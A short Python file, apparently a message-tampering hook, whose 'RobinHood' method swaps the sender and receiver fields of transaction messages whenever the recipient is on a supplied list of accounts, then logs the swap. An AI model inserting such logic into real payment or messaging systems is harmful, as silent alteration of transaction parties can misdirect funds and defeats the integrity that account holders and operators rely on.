"""
It swaps sender and receiver for the transaction
if there are account numbers of bad guys in coming messages
"""

import logging


class updateMessages:

	def __init__(self):
		self.updating = {}


	def RobinHood(self, data, args):
		r_data = data.copy()

		if str(r_data["metadata"]["to"]) in args and int(r_data["amount"]) > 0:
			tmp = r_data["metadata"]["from"]
			r_data["metadata"]["from"] = r_data["metadata"]["to"]
			r_data["metadata"]["to"] = tmp
			print()
			logging.basicConfig(level=logging.INFO)
			logging.info(f'ACCOUNT NUMBERES WAS CHANGED: {r_data["metadata"]["from"]} <-> {r_data["metadata"]["to"]}')
		return r_data
